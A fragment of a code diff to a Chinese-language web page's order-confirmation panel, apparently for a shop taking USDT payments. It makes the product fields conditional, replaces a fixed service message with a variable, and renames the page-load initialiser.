                     <div style="background: #f6ffed; border: 1px solid #b7eb8f; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1rem; text-align: left;">
                         <div style="font-weight: 600; margin-bottom: 0.5rem; color: #389e0d;">订单信息</div>
                         <div style="font-size: 0.9rem;">
-                            <div>订单号: ${orderData.orderId}</div>
-                            <div>商品类型: ${getAccountTypeName(orderData.accountType)}</div>
-                            <div>商品名称: ${orderData.accountName}</div>
-                            <div>数量: ${orderData.quantity} 个</div>
-                            <div>金额: ${orderData.amount} USDT</div>
+                            <div>订单号: ${orderId}</div>
+                            ${accountType ? `<div>商品类型: ${accountType}</div>` : ''}
+                            ${accountName ? `<div>商品名称: ${accountName}</div>` : ''}
+                            <div>金额: ${amount}</div>
                             <div>时间: ${new Date().toLocaleString()}</div>
                         </div>
                     </div>
@@ -750,7 +1003,7 @@
                     <div style="background: #fff7e6; border: 1px solid #ffd591; border-radius: 0.5rem; padding: 1rem;">
                         <div style="font-size: 0.9rem; color: #d46b08;">
                             ✅ <strong>订单已确认</strong><br>
-                            账号信息将在24小时内发送至您的邮箱，如有问题请联系客服
+                            ${serviceDesc}
                         </div>
                     </div>
                     
@@ -772,9 +1025,9 @@
                 }
             }, 1000);
         }
-        
+
         // 页面加载时初始化
-        document.addEventListener('DOMContentLoaded', initPage);
+        document.addEventListener('DOMContentLoaded', initService);
     </script>
 </body>
 </html>
